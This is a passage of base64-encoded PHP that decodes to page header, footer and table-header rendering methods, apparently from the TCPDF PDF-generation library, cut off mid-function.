pbiA9ICRmbTsKCX0KCgkvKioKCSAqIFJldHVybnMgZm9vdGVyIG1hcmdpbiBpbiB1c2VyIHVuaXRzLgoJICogQHJldHVybiBmbG9hdAoJICogQHNpbmNlIDQuMC4wMTIgKDIwMDgtMDctMjQpCgkgKiBAcHVibGljCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRGb290ZXJNYXJnaW4oKSB7CgkJcmV0dXJuICR0aGlzLT5mb290ZXJfbWFyZ2luOwoJfQoJLyoqCgkgKiBTZXQgYSBmbGFnIHRvIHByaW50IHBhZ2UgaGVhZGVyLgoJICogQHBhcmFtIGJvb2xlYW4gJHZhbCBzZXQgdG8gdHJ1ZSB0byBwcmludCB0aGUgcGFnZSBoZWFkZXIgKGRlZmF1bHQpLCBmYWxzZSBvdGhlcndpc2UuCgkgKiBAcHVibGljCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRQcmludEhlYWRlcigkdmFsPXRydWUpIHsKCQkkdGhpcy0+cHJpbnRfaGVhZGVyID0gJHZhbCA/IHRydWUgOiBmYWxzZTsKCX0KCgkvKioKCSAqIFNldCBhIGZsYWcgdG8gcHJpbnQgcGFnZSBmb290ZXIuCgkgKiBAcGFyYW0gYm9vbGVhbiAkdmFsIHNldCB0byB0cnVlIHRvIHByaW50IHRoZSBwYWdlIGZvb3RlciAoZGVmYXVsdCksIGZhbHNlIG90aGVyd2lzZS4KCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFByaW50Rm9vdGVyKCR2YWw9dHJ1ZSkgewoJCSR0aGlzLT5wcmludF9mb290ZXIgPSAkdmFsID8gdHJ1ZSA6IGZhbHNlOwoJfQoKCS8qKgoJICogUmV0dXJuIHRoZSByaWdodC1ib3R0b20gKG9yIGxlZnQtYm90dG9tIGZvciBSVEwpIGNvcm5lciBYIGNvb3JkaW5hdGUgb2YgbGFzdCBpbnNlcnRlZCBpbWFnZQoJICogQHJldHVybiBmbG9hdAoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0SW1hZ2VSQlgoKSB7CgkJcmV0dXJuICR0aGlzLT5pbWdfcmJfeDsKCX0KCgkvKioKCSAqIFJldHVybiB0aGUgcmlnaHQtYm90dG9tIChvciBsZWZ0LWJvdHRvbSBmb3IgUlRMKSBjb3JuZXIgWSBjb29yZGluYXRlIG9mIGxhc3QgaW5zZXJ0ZWQgaW1hZ2UKCSAqIEByZXR1cm4gZmxvYXQKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldEltYWdlUkJZKCkgewoJCXJldHVybiAkdGhpcy0+aW1nX3JiX3k7Cgl9CgoJLyoqCgkgKiBSZXNldCB0aGUgeG9iamVjdCB0ZW1wbGF0ZSB1c2VkIGJ5IEhlYWRlcigpIG1ldGhvZC4KCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHJlc2V0SGVhZGVyVGVtcGxhdGUoKSB7CgkJJHRoaXMtPmhlYWRlcl94b2JqaWQgPSBmYWxzZTsKCX0KCgkvKioKCSAqIFNldCBhIGZsYWcgdG8gYXV0b21hdGljYWxseSByZXNldCB0aGUgeG9iamVjdCB0ZW1wbGF0ZSB1c2VkIGJ5IEhlYWRlcigpIG1ldGhvZCBhdCBlYWNoIHBhZ2UuCgkgKiBAcGFyYW0gYm9vbGVhbiAkdmFsIHNldCB0byB0cnVlIHRvIHJlc2V0IEhlYWRlciB4b2JqZWN0IHRlbXBsYXRlIGF0IGVhY2ggcGFnZSwgZmFsc2Ugb3RoZXJ3aXNlLgoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0SGVhZGVyVGVtcGxhdGVBdXRvcmVzZXQoJHZhbD10cnVlKSB7CgkJJHRoaXMtPmhlYWRlcl94b2JqX2F1dG9yZXNldCA9ICR2YWwgPyB0cnVlIDogZmFsc2U7Cgl9CgoJLyoqCgkgKiBUaGlzIG1ldGhvZCBpcyB1c2VkIHRvIHJlbmRlciB0aGUgcGFnZSBoZWFkZXIuCgkgKiBJdCBpcyBhdXRvbWF0aWNhbGx5IGNhbGxlZCBieSBBZGRQYWdlKCkgYW5kIGNvdWxkIGJlIG92ZXJ3cml0dGVuIGluIHlvdXIgb3duIGluaGVyaXRlZCBjbGFzcy4KCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIEhlYWRlcigpIHsKCQlpZiAoJHRoaXMtPmhlYWRlcl94b2JqaWQgPT09IGZhbHNlKSB7CgkJCS8vIHN0YXJ0IGEgbmV3IFhPYmplY3QgVGVtcGxhdGUKCQkJJHRoaXMtPmhlYWRlcl94b2JqaWQgPSAkdGhpcy0+c3RhcnRUZW1wbGF0ZSgkdGhpcy0+dywgJHRoaXMtPnRNYXJnaW4pOwoJCQkkaGVhZGVyZm9udCA9ICR0aGlzLT5nZXRIZWFkZXJGb250KCk7CgkJCSRoZWFkZXJkYXRhID0gJHRoaXMtPmdldEhlYWRlckRhdGEoKTsKCQkJJHRoaXMtPnkgPSAkdGhpcy0+aGVhZGVyX21hcmdpbjsKCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCSR0aGlzLT54ID0gJHRoaXMtPncgLSAkdGhpcy0+b3JpZ2luYWxfck1hcmdpbjsKCQkJfSBlbHNlIHsKCQkJCSR0aGlzLT54ID0gJHRoaXMtPm9yaWdpbmFsX2xNYXJnaW47CgkJCX0KCQkJaWYgKCgkaGVhZGVyZGF0YVsnbG9nbyddKSBBTkQgKCRoZWFkZXJkYXRhWydsb2dvJ10gIT0gS19CTEFOS19JTUFHRSkpIHsKCQkJCSRpbWd0eXBlID0gVENQREZfSU1BR0VTOjpnZXRJbWFnZUZpbGVUeXBlKEtfUEFUSF9JTUFHRVMuJGhlYWRlcmRhdGFbJ2xvZ28nXSk7CgkJCQlpZiAoKCRpbWd0eXBlID09ICdlcHMnKSBPUiAoJGltZ3R5cGUgPT0gJ2FpJykpIHsKCQkJCQkkdGhpcy0+SW1hZ2VFcHMoS19QQVRIX0lNQUdFUy4kaGVhZGVyZGF0YVsnbG9nbyddLCAnJywgJycsICRoZWFkZXJkYXRhWydsb2dvX3dpZHRoJ10pOwoJCQkJfSBlbHNlaWYgKCRpbWd0eXBlID09ICdzdmcnKSB7CgkJCQkJJHRoaXMtPkltYWdlU1ZHKEtfUEFUSF9JTUFHRVMuJGhlYWRlcmRhdGFbJ2xvZ28nXSwgJycsICcnLCAkaGVhZGVyZGF0YVsnbG9nb193aWR0aCddKTsKCQkJCX0gZWxzZSB7CgkJCQkJJHRoaXMtPkltYWdlKEtfUEFUSF9JTUFHRVMuJGhlYWRlcmRhdGFbJ2xvZ28nXSwgJycsICcnLCAkaGVhZGVyZGF0YVsnbG9nb193aWR0aCddKTsKCQkJCX0KCQkJCSRpbWd5ID0gJHRoaXMtPmdldEltYWdlUkJZKCk7CgkJCX0gZWxzZSB7CgkJCQkkaW1neSA9ICR0aGlzLT55OwoJCQl9CgkJCSRjZWxsX2hlaWdodCA9ICR0aGlzLT5nZXRDZWxsSGVpZ2h0KCRoZWFkZXJmb250WzJdIC8gJHRoaXMtPmspOwoJCQkvLyBzZXQgc3RhcnRpbmcgbWFyZ2luIGZvciB0ZXh0IGRhdGEgY2VsbAoJCQlpZiAoJHRoaXMtPmdldFJUTCgpKSB7CgkJCQkkaGVhZGVyX3ggPSAkdGhpcy0+b3JpZ2luYWxfck1hcmdpbiArICgkaGVhZGVyZGF0YVsnbG9nb193aWR0aCddICogMS4xKTsKCQkJfSBlbHNlIHsKCQkJCSRoZWFkZXJfeCA9ICR0aGlzLT5vcmlnaW5hbF9sTWFyZ2luICsgKCRoZWFkZXJkYXRhWydsb2dvX3dpZHRoJ10gKiAxLjEpOwoJCQl9CgkJCSRjdyA9ICR0aGlzLT53IC0gJHRoaXMtPm9yaWdpbmFsX2xNYXJnaW4gLSAkdGhpcy0+b3JpZ2luYWxfck1hcmdpbiAtICgkaGVhZGVyZGF0YVsnbG9nb193aWR0aCddICogMS4xKTsKCQkJJHRoaXMtPnNldFRleHRDb2xvckFycmF5KCR0aGlzLT5oZWFkZXJfdGV4dF9jb2xvcik7CgkJCS8vIGhlYWRlciB0aXRsZQoJCQkkdGhpcy0+c2V0Rm9udCgkaGVhZGVyZm9udFswXSwgJ0InLCAkaGVhZGVyZm9udFsyXSArIDEpOwoJCQkkdGhpcy0+c2V0WCgkaGVhZGVyX3gpOwoJCQkkdGhpcy0+Q2VsbCgkY3csICRjZWxsX2hlaWdodCwgJGhlYWRlcmRhdGFbJ3RpdGxlJ10sIDAsIDEsICcnLCAwLCAnJywgMCk7CgkJCS8vIGhlYWRlciBzdHJpbmcKCQkJJHRoaXMtPnNldEZvbnQoJGhlYWRlcmZvbnRbMF0sICRoZWFkZXJmb250WzFdLCAkaGVhZGVyZm9udFsyXSk7CgkJCSR0aGlzLT5zZXRYKCRoZWFkZXJfeCk7CgkJCSR0aGlzLT5NdWx0aUNlbGwoJGN3LCAkY2VsbF9oZWlnaHQsICRoZWFkZXJkYXRhWydzdHJpbmcnXSwgMCwgJycsIDAsIDEsICcnLCAnJywgdHJ1ZSwgMCwgZmFsc2UsIHRydWUsIDAsICdUJywgZmFsc2UpOwoJCQkvLyBwcmludCBhbiBlbmRpbmcgaGVhZGVyIGxpbmUKCQkJJHRoaXMtPnNldExpbmVTdHlsZShhcnJheSgnd2lkdGgnID0+IDAuODUgLyAkdGhpcy0+aywgJ2NhcCcgPT4gJ2J1dHQnLCAnam9pbicgPT4gJ21pdGVyJywgJ2Rhc2gnID0+IDAsICdjb2xvcicgPT4gJGhlYWRlcmRhdGFbJ2xpbmVfY29sb3InXSkpOwoJCQkkdGhpcy0+c2V0WSgoMi44MzUgLyAkdGhpcy0+aykgKyBtYXgoJGltZ3ksICR0aGlzLT55KSk7CgkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkkdGhpcy0+c2V0WCgkdGhpcy0+b3JpZ2luYWxfck1hcmdpbik7CgkJCX0gZWxzZSB7CgkJCQkkdGhpcy0+c2V0WCgkdGhpcy0+b3JpZ2luYWxfbE1hcmdpbik7CgkJCX0KCQkJJHRoaXMtPkNlbGwoKCR0aGlzLT53IC0gJHRoaXMtPm9yaWdpbmFsX2xNYXJnaW4gLSAkdGhpcy0+b3JpZ2luYWxfck1hcmdpbiksIDAsICcnLCAnVCcsIDAsICdDJyk7CgkJCSR0aGlzLT5lbmRUZW1wbGF0ZSgpOwoJCX0KCQkvLyBwcmludCBoZWFkZXIgdGVtcGxhdGUKCQkkeCA9IDA7CgkJJGR4ID0gMDsKCQlpZiAoISR0aGlzLT5oZWFkZXJfeG9ial9hdXRvcmVzZXQgQU5EICR0aGlzLT5ib29rbGV0IEFORCAoKCR0aGlzLT5wYWdlICUgMikgPT0gMCkpIHsKCQkJLy8gYWRqdXN0IG1hcmdpbnMgZm9yIGJvb2tsZXQgbW9kZQoJCQkkZHggPSAoJHRoaXMtPm9yaWdpbmFsX2xNYXJnaW4gLSAkdGhpcy0+b3JpZ2luYWxfck1hcmdpbik7CgkJfQoJCWlmICgkdGhpcy0+cnRsKSB7CgkJCSR4ID0gJHRoaXMtPncgKyAkZHg7CgkJfSBlbHNlIHsKCQkJJHggPSAwICsgJGR4OwoJCX0KCQkkdGhpcy0+cHJpbnRUZW1wbGF0ZSgkdGhpcy0+aGVhZGVyX3hvYmppZCwgJHgsIDAsIDAsIDAsICcnLCAnJywgZmFsc2UpOwoJCWlmICgkdGhpcy0+aGVhZGVyX3hvYmpfYXV0b3Jlc2V0KSB7CgkJCS8vIHJlc2V0IGhlYWRlciB4b2JqZWN0IHRlbXBsYXRlIGF0IGVhY2ggcGFnZQoJCQkkdGhpcy0+aGVhZGVyX3hvYmppZCA9IGZhbHNlOwoJCX0KCX0KCgkvKioKCSAqIFRoaXMgbWV0aG9kIGlzIHVzZWQgdG8gcmVuZGVyIHRoZSBwYWdlIGZvb3Rlci4KCSAqIEl0IGlzIGF1dG9tYXRpY2FsbHkgY2FsbGVkIGJ5IEFkZFBhZ2UoKSBhbmQgY291bGQgYmUgb3ZlcndyaXR0ZW4gaW4geW91ciBvd24gaW5oZXJpdGVkIGNsYXNzLgoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gRm9vdGVyKCkgewoJCSRjdXJfeSA9ICR0aGlzLT55OwoJCSR0aGlzLT5zZXRUZXh0Q29sb3JBcnJheSgkdGhpcy0+Zm9vdGVyX3RleHRfY29sb3IpOwoJCS8vc2V0IHN0eWxlIGZvciBjZWxsIGJvcmRlcgoJCSRsaW5lX3dpZHRoID0gKDAuODUgLyAkdGhpcy0+ayk7CgkJJHRoaXMtPnNldExpbmVTdHlsZShhcnJheSgnd2lkdGgnID0+ICRsaW5lX3dpZHRoLCAnY2FwJyA9PiAnYnV0dCcsICdqb2luJyA9PiAnbWl0ZXInLCAnZGFzaCcgPT4gMCwgJ2NvbG9yJyA9PiAkdGhpcy0+Zm9vdGVyX2xpbmVfY29sb3IpKTsKCQkvL3ByaW50IGRvY3VtZW50IGJhcmNvZGUKCQkkYmFyY29kZSA9ICR0aGlzLT5nZXRCYXJjb2RlKCk7CgkJaWYgKCFlbXB0eSgkYmFyY29kZSkpIHsKCQkJJHRoaXMtPkxuKCRsaW5lX3dpZHRoKTsKCQkJJGJhcmNvZGVfd2lkdGggPSByb3VuZCgoJHRoaXMtPncgLSAkdGhpcy0+b3JpZ2luYWxfbE1hcmdpbiAtICR0aGlzLT5vcmlnaW5hbF9yTWFyZ2luKSAvIDMpOwoJCQkkc3R5bGUgPSBhcnJheSgKCQkJCSdwb3NpdGlvbicgPT4gJHRoaXMtPnJ0bD8nUic6J0wnLAoJCQkJJ2FsaWduJyA9PiAkdGhpcy0+cnRsPydSJzonTCcsCgkJCQknc3RyZXRjaCcgPT4gZmFsc2UsCgkJCQknZml0d2lkdGgnID0+IHRydWUsCgkJCQknY2VsbGZpdGFsaWduJyA9PiAnJywKCQkJCSdib3JkZXInID0+IGZhbHNlLAoJCQkJJ3BhZGRpbmcnID0+IDAsCgkJCQknZmdjb2xvcicgPT4gYXJyYXkoMCwwLDApLAoJCQkJJ2JnY29sb3InID0+IGZhbHNlLAoJCQkJJ3RleHQnID0+IGZhbHNlCgkJCSk7CgkJCSR0aGlzLT53cml0ZTFEQmFyY29kZSgkYmFyY29kZSwgJ0MxMjgnLCAnJywgJGN1cl95ICsgJGxpbmVfd2lkdGgsICcnLCAoKCR0aGlzLT5mb290ZXJfbWFyZ2luIC8gMykgLSAkbGluZV93aWR0aCksIDAuMywgJHN0eWxlLCAnJyk7CgkJfQoJCSR3X3BhZ2UgPSBpc3NldCgkdGhpcy0+bFsnd19wYWdlJ10pID8gJHRoaXMtPmxbJ3dfcGFnZSddLicgJyA6ICcnOwoJCWlmIChlbXB0eSgkdGhpcy0+cGFnZWdyb3VwcykpIHsKCQkJJHBhZ2VudW10eHQgPSAkd19wYWdlLiR0aGlzLT5nZXRBbGlhc051bVBhZ2UoKS4nIC8gJy4kdGhpcy0+Z2V0QWxpYXNOYlBhZ2VzKCk7CgkJfSBlbHNlIHsKCQkJJHBhZ2VudW10eHQgPSAkd19wYWdlLiR0aGlzLT5nZXRQYWdlTnVtR3JvdXBBbGlhcygpLicgLyAnLiR0aGlzLT5nZXRQYWdlR3JvdXBBbGlhcygpOwoJCX0KCQkkdGhpcy0+c2V0WSgkY3VyX3kpOwoJCS8vUHJpbnQgcGFnZSBudW1iZXIKCQlpZiAoJHRoaXMtPmdldFJUTCgpKSB7CgkJCSR0aGlzLT5zZXRYKCR0aGlzLT5vcmlnaW5hbF9yTWFyZ2luKTsKCQkJJHRoaXMtPkNlbGwoMCwgMCwgJHBhZ2VudW10eHQsICdUJywgMCwgJ0wnKTsKCQl9IGVsc2UgewoJCQkkdGhpcy0+c2V0WCgkdGhpcy0+b3JpZ2luYWxfbE1hcmdpbik7CgkJCSR0aGlzLT5DZWxsKDAsIDAsICR0aGlzLT5nZXRBbGlhc1JpZ2h0U2hpZnQoKS4kcGFnZW51bXR4dCwgJ1QnLCAwLCAnUicpOwoJCX0KCX0KCgkvKioKCSAqIFRoaXMgbWV0aG9kIGlzIHVzZWQgdG8gcmVuZGVyIHRoZSBwYWdlIGhlYWRlci4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjAuMDEyICgyMDA4LTA3LTI0KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0SGVhZGVyKCkgewoJCWlmICghJHRoaXMtPnByaW50X2hlYWRlciBPUiAoJHRoaXMtPnN0YXRlICE9IDIpKSB7CgkJCXJldHVybjsKCQl9CgkJJHRoaXMtPkluSGVhZGVyID0gdHJ1ZTsKCQkkdGhpcy0+c2V0R3JhcGhpY1ZhcnMoJHRoaXMtPmRlZmF1bHRfZ3JhcGhpY192YXJzKTsKCQkkdGVtcF90aGVhZCA9ICR0aGlzLT50aGVhZDsKCQkkdGVtcF90aGVhZE1hcmdpbnMgPSAkdGhpcy0+dGhlYWRNYXJnaW5zOwoJCSRsYXN0aCA9ICR0aGlzLT5sYXN0aDsKCQkkbmV3bGluZSA9ICR0aGlzLT5uZXdsaW5lOwoJCSR0aGlzLT5fb3V0U2F2ZUdyYXBoaWNzU3RhdGUoKTsKCQkkdGhpcy0+ck1hcmdpbiA9ICR0aGlzLT5vcmlnaW5hbF9yTWFyZ2luOwoJCSR0aGlzLT5sTWFyZ2luID0gJHRoaXMtPm9yaWdpbmFsX2xNYXJnaW47CgkJJHRoaXMtPnNldENlbGxQYWRkaW5nKDApOwoJCS8vc2V0IGN1cnJlbnQgcG9zaXRpb24KCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkkdGhpcy0+c2V0WFkoJHRoaXMtPm9yaWdpbmFsX3JNYXJnaW4sICR0aGlzLT5oZWFkZXJfbWFyZ2luKTsKCQl9IGVsc2UgewoJCQkkdGhpcy0+c2V0WFkoJHRoaXMtPm9yaWdpbmFsX2xNYXJnaW4sICR0aGlzLT5oZWFkZXJfbWFyZ2luKTsKCQl9CgkJJHRoaXMtPnNldEZvbnQoJHRoaXMtPmhlYWRlcl9mb250WzBdLCAkdGhpcy0+aGVhZGVyX2ZvbnRbMV0sICR0aGlzLT5oZWFkZXJfZm9udFsyXSk7CgkJJHRoaXMtPkhlYWRlcigpOwoJCS8vcmVzdG9yZSBwb3NpdGlvbgoJCWlmICgkdGhpcy0+cnRsKSB7CgkJCSR0aGlzLT5zZXRYWSgkdGhpcy0+b3JpZ2luYWxfck1hcmdpbiwgJHRoaXMtPnRNYXJnaW4pOwoJCX0gZWxzZSB7CgkJCSR0aGlzLT5zZXRYWSgkdGhpcy0+b3JpZ2luYWxfbE1hcmdpbiwgJHRoaXMtPnRNYXJnaW4pOwoJCX0KCQkkdGhpcy0+X291dFJlc3RvcmVHcmFwaGljc1N0YXRlKCk7CgkJJHRoaXMtPmxhc3RoID0gJGxhc3RoOwoJCSR0aGlzLT50aGVhZCA9ICR0ZW1wX3RoZWFkOwoJCSR0aGlzLT50aGVhZE1hcmdpbnMgPSAkdGVtcF90aGVhZE1hcmdpbnM7CgkJJHRoaXMtPm5ld2xpbmUgPSAkbmV3bGluZTsKCQkkdGhpcy0+SW5IZWFkZXIgPSBmYWxzZTsKCX0KCgkvKioKCSAqIFRoaXMgbWV0aG9kIGlzIHVzZWQgdG8gcmVuZGVyIHRoZSBwYWdlIGZvb3Rlci4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjAuMDEyICgyMDA4LTA3LTI0KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0Rm9vdGVyKCkgewoJCWlmICgkdGhpcy0+c3RhdGUgIT0gMikgewoJCQlyZXR1cm47CgkJfQoJCSR0aGlzLT5JbkZvb3RlciA9IHRydWU7CgkJLy8gc2F2ZSBjdXJyZW50IGdyYXBoaWMgc2V0dGluZ3MKCQkkZ3ZhcnMgPSAkdGhpcy0+Z2V0R3JhcGhpY1ZhcnMoKTsKCQkvLyBtYXJrIHRoaXMgcG9pbnQKCQkkdGhpcy0+Zm9vdGVycG9zWyR0aGlzLT5wYWdlXSA9ICR0aGlzLT5wYWdlbGVuWyR0aGlzLT5wYWdlXTsKCQkkdGhpcy0+X291dCgiXG4iKTsKCQlpZiAoJHRoaXMtPnByaW50X2Zvb3RlcikgewoJCQkkdGhpcy0+c2V0R3JhcGhpY1ZhcnMoJHRoaXMtPmRlZmF1bHRfZ3JhcGhpY192YXJzKTsKCQkJJHRoaXMtPmN1cnJlbnRfY29sdW1uID0gMDsKCQkJJHRoaXMtPm51bV9jb2x1bW5zID0gMTsKCQkJJHRlbXBfdGhlYWQgPSAkdGhpcy0+dGhlYWQ7CgkJCSR0ZW1wX3RoZWFkTWFyZ2lucyA9ICR0aGlzLT50aGVhZE1hcmdpbnM7CgkJCSRsYXN0aCA9ICR0aGlzLT5sYXN0aDsKCQkJJHRoaXMtPl9vdXRTYXZlR3JhcGhpY3NTdGF0ZSgpOwoJCQkkdGhpcy0+ck1hcmdpbiA9ICR0aGlzLT5vcmlnaW5hbF9yTWFyZ2luOwoJCQkkdGhpcy0+bE1hcmdpbiA9ICR0aGlzLT5vcmlnaW5hbF9sTWFyZ2luOwoJCQkkdGhpcy0+c2V0Q2VsbFBhZGRpbmcoMCk7CgkJCS8vc2V0IGN1cnJlbnQgcG9zaXRpb24KCQkJJGZvb3Rlcl95ID0gJHRoaXMtPmggLSAkdGhpcy0+Zm9vdGVyX21hcmdpbjsKCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCSR0aGlzLT5zZXRYWSgkdGhpcy0+b3JpZ2luYWxfck1hcmdpbiwgJGZvb3Rlcl95KTsKCQkJfSBlbHNlIHsKCQkJCSR0aGlzLT5zZXRYWSgkdGhpcy0+b3JpZ2luYWxfbE1hcmdpbiwgJGZvb3Rlcl95KTsKCQkJfQoJCQkkdGhpcy0+c2V0Rm9udCgkdGhpcy0+Zm9vdGVyX2ZvbnRbMF0sICR0aGlzLT5mb290ZXJfZm9udFsxXSwgJHRoaXMtPmZvb3Rlcl9mb250WzJdKTsKCQkJJHRoaXMtPkZvb3RlcigpOwoJCQkvL3Jlc3RvcmUgcG9zaXRpb24KCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCSR0aGlzLT5zZXRYWSgkdGhpcy0+b3JpZ2luYWxfck1hcmdpbiwgJHRoaXMtPnRNYXJnaW4pOwoJCQl9IGVsc2UgewoJCQkJJHRoaXMtPnNldFhZKCR0aGlzLT5vcmlnaW5hbF9sTWFyZ2luLCAkdGhpcy0+dE1hcmdpbik7CgkJCX0KCQkJJHRoaXMtPl9vdXRSZXN0b3JlR3JhcGhpY3NTdGF0ZSgpOwoJCQkkdGhpcy0+bGFzdGggPSAkbGFzdGg7CgkJCSR0aGlzLT50aGVhZCA9ICR0ZW1wX3RoZWFkOwoJCQkkdGhpcy0+dGhlYWRNYXJnaW5zID0gJHRlbXBfdGhlYWRNYXJnaW5zOwoJCX0KCQkvLyByZXN0b3JlIGdyYXBoaWMgc2V0dGluZ3MKCQkkdGhpcy0+c2V0R3JhcGhpY1ZhcnMoJGd2YXJzKTsKCQkkdGhpcy0+Y3VycmVudF9jb2x1bW4gPSAkZ3ZhcnNbJ2N1cnJlbnRfY29sdW1uJ107CgkJJHRoaXMtPm51bV9jb2x1bW5zID0gJGd2YXJzWydudW1fY29sdW1ucyddOwoJCS8vIGNhbGN1bGF0ZSBmb290ZXIgbGVuZ3RoCgkJJHRoaXMtPmZvb3RlcmxlblskdGhpcy0+cGFnZV0gPSAkdGhpcy0+cGFnZWxlblskdGhpcy0+cGFnZV0gLSAkdGhpcy0+Zm9vdGVycG9zWyR0aGlzLT5wYWdlXSArIDE7CgkJJHRoaXMtPkluRm9vdGVyID0gZmFsc2U7Cgl9CgoJLyoqCgkgKiBDaGVjayBpZiB3ZSBhcmUgb24gdGhlIHBhZ2UgYm9keSAoZXhjbHVkaW5nIHBhZ2UgaGVhZGVyIGFuZCBmb290ZXIpLgoJICogQHJldHVybiBib29sIHRydWUgaWYgd2UgYXJlIG5vdCBpbiBwYWdlIGhlYWRlciBub3IgaW4gcGFnZSBmb290ZXIsIGZhbHNlIG90aGVyd2lzZS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjkuMDkxICgyMDExLTA2LTE1KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gaW5QYWdlQm9keSgpIHsKCQlyZXR1cm4gKCgkdGhpcy0+SW5IZWFkZXIgPT09IGZhbHNlKSBBTkQgKCR0aGlzLT5JbkZvb3RlciA9PT0gZmFsc2UpKTsKCX0KCgkvKioKCSAqIFRoaXMgbWV0aG9kIGlzIHVzZWQgdG8gcmVuZGVyIHRoZSB0YWJsZSBoZWFkZXIgb24gbmV3IHBhZ2UgKGlmIGFueSkuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC41LjAzMCAoMjAwOS0wMy0yNSkKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIHNldFRhYmxlSGVhZGVyKCkgewoJCWlmICgkdGhpcy0+bnVtX2NvbHVtbnMgPiAxKSB7CgkJCS8vIG11bHRpIGNvbHVtbiBtb2RlCgkJCXJldHVybjsKCQl9CgkJaWYgKGlzc2V0KCR0aGlzLT50aGVhZE1hcmdpbnNbJ3RvcCddKSkgewoJCQkvLyByZXN0b3JlIHRoZSBvcmlnaW5hbCB0b3AtbWFyZ2luCgkJCSR0aGlzLT50TWFyZ2luID0gJHRoaXMtPnRoZWFkTWFyZ2luc1sndG9wJ107CgkJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndG0nXSA9ICR0aGlzLT50TWFyZ2luOwoJCQkkdGhpcy0+eSA9ICR0aGlzLT50TWFyZ2luOwoJCX0KCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0aGlzLT50aGVhZCkgQU5EICghJHRoaXMtPmludGhlYWQpKSB7CgkJCS8vIHNldCBtYXJnaW5zCgkJCSRwcmV2X2xNYXJnaW4gPSAkdGhpcy0+bE1hcmdpbjsKCQkJJHByZXZfck1hcmdpbiA9ICR0aGlzLT5yTWFyZ2luOwoJCQkkcHJldl9jZWxsX3BhZGRpbmcgPSAkdGhpcy0+Y2VsbF9wYWRkaW5nOwoJCQkkdGhpcy0+bE1hcmdpbiA9ICR0aGlzLT50aGVhZE1hcmdpbnNbJ2xtYXJnaW4nXSArICgkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ29sbSddIC0gJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnRoZWFkTWFyZ2luc1sncGFnZSddXVsnb2xtJ10pOwoJCQkkdGhpcy0+ck1hcmdpbiA9ICR0aGlzLT50aGVhZE1hcmdpbnNbJ3JtYXJnaW4nXSArICgkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ29ybSddIC0gJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnRoZWFkTWFyZ2luc1sncGFnZSddXVsnb3JtJ10pOwoJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nID0gJHRoaXMtPnRoZWFkTWFyZ2luc1snY2VsbF9wYWRkaW5nJ107CgkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkkdGhpcy0+eCA9ICR0aGlzLT53IC0gJHRoaXMtPnJNYXJnaW47CgkJCX0gZWxzZSB7CgkJCQkkdGhpcy0+eCA9ICR0aGlzLT5sTWFyZ2luOwoJCQl9CgkJCS8vIGFjY291bnQgZm9yIHNwZWNpYWwgImNlbGwiIG1vZGUKCQkJaWYgKCR0aGlzLT50aGVhZE1hcmdpbnNbJ2NlbGwnXSkgewoJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkkdGhpcy0+eCAtPSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ107CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT54ICs9ICR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXTsKCQkJCX0KCQkJfQoJCQkkZ3ZhcnMgPSAkdGhpcy0+Z2V0R3JhcGhpY1ZhcnMoKTsKCQkJaWYgKCFlbXB0eSgkdGhpcy0+dGhlYWRNYXJnaW5zWydndmFycyddKSkgewoJCQkJLy8gc2V0IHRoZSBjb3JyZWN0IGdyYXBoaWMgc3R5bGUKCQkJCSR0aGlzLT5zZXRHcmFwaGljVmFycygkdGhpcy0+dGhlYWRNYXJnaW5zWydndmFycyddKTsKCQkJCSR0aGlzLT5yTWFyZ2luID0gJGd2YXJzWydyTWFyZ2luJ107CgkJCQkkdGhpcy0+bE1hcmdpbiA9ICRndmFyc1snbE1hcmdpbiddOwoJCQl9CgkJCS8vIHByaW50IHRhYmxlIGhlYWRlcgoJCQkkdGhpcy0+d3JpdGVIVE1MKCR0aGlzLT50aGVhZCwgZmFsc2UsIGZhbHNlLCBmYWxzZSwgZmFsc2UsICcnKTsKCQkJJHRoaXMtPnNldEdyYXBoaWNWYXJzKCRndmFycyk7CgkJCS8vIHNldCBuZXcgdG9wIG1hcmdpbiB0byBza2lwIHRoZSB0YWJsZSBoZWFkZXJzCgkJCWlmICghaXNzZXQoJHRoaXMtPnRoZWFkTWFyZ2luc1sndG9wJ10pKSB7CgkJCQkkdGhpcy0+dGhlYWRNYXJnaW5zWyd0b3AnXSA9ICR0aGlzLT50TWFyZ2luOwoJCQl9CgkJCS8vIHN0b3JlIGVuZCBvZiBoZWFkZXIgcG9zaXRpb24KCQkJaWYgKCFpc3NldCgk